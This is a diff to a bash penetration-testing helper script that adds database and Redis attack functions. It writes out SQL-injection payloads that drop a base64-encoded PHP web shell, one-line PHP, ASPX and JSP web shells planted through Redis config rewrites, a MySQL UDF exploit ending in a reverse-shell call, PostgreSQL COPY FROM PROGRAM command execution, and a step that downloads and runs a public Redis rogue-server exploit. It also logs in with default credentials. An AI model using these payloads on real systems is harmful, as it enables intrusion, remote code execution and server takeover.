@@ -88,11 +88,16 @@ get_blind_sqli_commands() {
 
 get_mysql_injection() {
     if [[ ! -z "$1" ]]; then
-        cmd="$1"
+        webshell="$1"
     fi    
-    if [[ -z "$cmd" ]]; then
-        cmd="cmd"
+    if [[ -z $webshell ]]; then
+        create_php_web_shell
+        webshell=$(cat webshell.php)
     fi
+    webshell=$(minimize_script "$webshell")
+    echo "$webshell" > test.php
+    webshell=$(echo "$webshell" | base64 -w 0)
+
     if [[ ! -z "$2" ]]; then
         outfile_location=$2
     fi
@@ -103,7 +108,7 @@ get_mysql_injection() {
         num_sql_back_null="$3"
     fi
     if [[ -z "$num_sql_back_null" ]]; then
-        num_sql_back_null=4
+        num_sql_back_null=0
     fi
     if [[ -z "$num_sql_front_null" ]]; then
         num_sql_front_null=0
@@ -112,11 +117,192 @@ get_mysql_injection() {
     for ((i=1; i<=num_sql_back_null; i++)); do
         back_null_values+=", null"
     done
-    if [[ ! -z "$union_select" ]] && [[ $union_select == true ]]; then
-        echo  " UNION SELECT \"$cmd'\" $back_null_values INTO OUTFILE \"$outfile_location\""
+    if [[ ! -z "$sqli_type" ]] && [[ $sqli_type == "union"  ]]; then
+        echo  " UNION SELECT FROM_BASE64('$webshell') $back_null_values INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
     else
-        echo  " OR 1=1 IN (Select '$cmd') INTO OUTFILE \"$outfile_location\""
+        echo  " ;Select FROM_BASE64('$webshell') INTO OUTFILE '$outfile_location' FIELDS ESCAPED BY ''; -- //"
     fi
+}
+
+run_psql() {
+
+    if [[ -z $username ]]; then
+        username=postgres
+        echo "Username is not set, using default $username"
+    fi
+    if [[ -z $target_ip ]]; then
+        target_ip=$ip
+        echo "Target IP is not set, using default $target_ip"
+    fi
+    if [[ -z $target_port ]]; then
+        target_port=5432
+        echo "Target port is not set, using default $target_port"
+    fi
+    if [[ -z $password ]]; then
+        password=postgres
+        echo "Password is not set, using default $password"
+    fi
+    if ! pgrep -f "psql -U $username -h $target_ip -p $target_port"; then
+        PGPASSWORD=$password psql -U $username -h $target_ip -p $target_port
+    else
+        echo "psql session already running"
+    fi
+
+
+}
+
+run_mysql() {
+
+    if [[ -z $username ]]; then
+        username=root
+        echo "Username is not set, using default $username"
+    fi
+    if [[ -z $target_ip ]]; then
+        target_ip=$ip
+        echo "Target IP is not set, using default $target_ip"
+    fi
+    if [[ -z $target_port ]]; then
+        target_port=3306
+        echo "Target port is not set, using default $target_port"
+    fi
+    local password_option=""
+    if [[ ! -z $password ]]; then
+        password_option="-p$password"
+    fi
+    mysql_additional_options="$mysql_additional_options --skip-ssl"
+    if ! pgrep -f "mysql -u $username -h $target_ip -P $target_port"; then
+        mysql -u "$username" -h "$target_ip" -P "$target_port" $password_option $mysql_additional_options #| tee -a "log/mysql_$target_ip.log"
+    else
+        echo "MySQL session already running"
+    fi
+
+}
+
+run_redis_cli() {
+    if [[ -z $target_ip ]]; then
+        target_ip=$ip
+        echo "Target IP is not set, using default $target_ip"
+    fi
+    if [[ -z $target_port ]]; then
+        target_port=6379
+        echo "Target port is not set, using default $target_port"
+    fi
+    local password_option=""
+    if [[ ! -z $password ]]; then
+        password_option="-a $password"
+    fi
+    if ! pgrep -f "redis-cli -h $target_ip"; then
+        redis-cli -h $target_ip -p $target_port $password_option | tee -a "log/redis_$target_ip.log"
+    else
+        echo "Redis-cli session already running"
+    fi
+}
+
+perform_redis_webshell_upload() {
+    if [[ -z $webshell ]]; then        
+        if [[ -z $webshell_type ]]; then
+            webshell_type="php"
+        fi
+        if [[ $webshell_type == "php" ]]; then
+            webshell='<?php system($_REQUEST["cmd"]); ?>'
+        elif [[ $webshell_type == "aspx" ]]; then
+            webshell='<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Process.Start(Request["cmd"]);%>'
+        elif [[ $webshell_type == "jsp" ]]; then
+            webshell='<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'
+        fi
+    fi
+    if [[ -z $output_path ]]; then
+        output_path="/var/www/html"
+    fi
+    echo 'flushall'
+    echo "set shell '$webshell'"
+    echo "config set dbfilename shell.$webshell_type"
+    echo "config set dir $output_path"
+    echo "save"
+}
+
+perform_redis_module_exploit() {
+    create_redis_module
+    if [[ -z $module_path ]]; then
+        echo "module_path is not set"
+        return 1
+    fi
+    echo "MODULE LOAD $module_path/$exploit_output"
+    echo "inject_command \"whoami\""
+}
+
+perform_mysql_udf_exploit() {
+    echo "select @@version_compile_os, @@version_compile_machine;"
+    echo "select @@plugin_dir ;"
+    if [[ -z "$target_arch" ]]; then
+        target_arch=linux_amd64
+    fi
+    local udf_file=""
+    if [[ $target_arch == "linux_amd64" ]]; then
+        udf_file="lib_mysqludf_sys_64.so"
+    elif [[ $target_arch == "linux_i386" ]]; then
+        udf_file="lib_mysqludf_sys_32.so"
+    elif [[ $target_arch == "windows_x86" ]]; then
+        udf_file="lib_mysqludf_sys_32.dll"
+    elif [[ $target_arch == "windows_x64" ]]; then
+        udf_file="lib_mysqludf_sys_x64.dll"
+    else
+        echo "Unsupported target OS for MySQL UDF exploit: $target_arch"
+        return 1
+    fi
+
+    cp "/usr/share/metasploit-framework/data/exploits/mysql/$udf_file" .
+    local temp_dir=""
+    if [[ $target_arch == *"linux"* ]]; then
+        temp_dir="/tmp"
+        generate_linux_download "$udf_file" "$temp_dir/$udf_file"
+        if [[ -z $cmd ]]; then
+            cmd=$(get_bash_reverse_shell)
+        fi
+    else
+        temp_dir='C:\windows\temp'
+        generate_windows_download "$udf_file" "$temp_dir\\$udf_file"
+    fi
+    if [[ -z $plugin_dir ]]; then
+        plugin_dir="/usr/lib/mysql/plugin"
+    fi
+
+
+    echo "select load_file('$temp_dir/$udf_file') into dumpfile '$plugin_dir/$udf_file';"
+    echo "create function sys_exec returns int soname '$udf_file';"
+    echo "create function sys_bineval returns int soname '$udf_file';"
+    echo "create function sys_eval returns string soname '$udf_file';"
+    echo "select sys_eval('$cmd');"
+}
+
+perform_redis_sync_exploit() {
+    local cve_dir="redis_sync_exploit"
+    local url="https://raw.githubusercontent.com/LoRexxar/redis-rogue-server/refs/heads/master/redis-rogue-server.py"
+    if [[ ! -d $cve_dir ]]; then
+        mkdir -p "$cve_dir"
+    fi
+    if [[ -z $target_ip ]]; then
+        target_ip=$ip
+        echo "Target IP is not set, using default $target_ip"
+    fi
+    if  [[ -z $target_port ]]; then
+        target_port=6379
+        echo "Target port is not set, using default $target_port"
+    fi    
+    pushd "$cve_dir" || return 1
+    create_redis_module
+    cp exploit_redis_module/redis_module.so exp.so
+    if [[ ! -f "redis-rogue-server.py" ]]; then
+        wget "$url" -O "redis-rogue-server.py"
+    fi
+    if [[ -z $host_ip ]]; then
+        host_ip=$(get_host_ip)
+    fi
+    if [[ -z $host_port ]]; then
+        host_port=6379
+    fi
+    python3 redis-rogue-server.py --rhost "$target_ip" --rport "$target_port" --lhost "$host_ip" --lport "$host_port"
+    popd || return 1
 }
 
 get_postgresql_read_files() {
@@ -128,13 +314,14 @@ get_postgresql_read_files() {
     echo 'SELECT * FROM read_files;'
 }
 
-get_postgresql_injection_execute_server_program() {
+get_postgresql_injection_execute_shell() {
 
     if [[ -z "$cmd" ]]; then
-        cmd="ls -al"
+        cmd=$(get_bash_reverse_shell)
     fi
     echo 'CREATE TABLE shell(output text);'
     echo "COPY shell FROM PROGRAM '$cmd';"
+    echo "select * from shell;"
 
 }
 
